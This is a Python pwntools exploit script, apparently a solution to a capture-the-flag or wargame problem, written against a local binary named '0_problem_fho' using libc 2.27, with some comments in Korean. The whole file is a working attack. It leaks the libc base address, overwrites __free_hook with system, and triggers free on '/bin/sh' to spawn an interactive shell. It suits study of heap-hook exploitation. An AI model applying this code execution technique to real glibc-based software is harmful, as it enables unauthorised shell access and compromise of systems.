#!/usr/bin/env python3
# Name: fho.py
from pwn import *
p = process('./0_problem_fho')
e = ELF('./0_problem_fho')
libc = ELF('./libc-2.27.so')
def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231) # gdb로 반환주소 위치 확인

# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
system = libc_base + libc.symbols['system']                                # system 상대주소 계산 가능
free_hook = libc_base + libc.symbols['__free_hook']                        # free 함수 상대 주소 계산
binsh = libc_base + next(libc.search(b'/bin/sh'))                          # 'bin/sh' 주소 확인
slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2] Overwrite `free_hook` with `system`
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

# [3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())                                            # free 함수 호출 시에 system 함수 호출, 인자 '/bin/sh'
p.interactive()
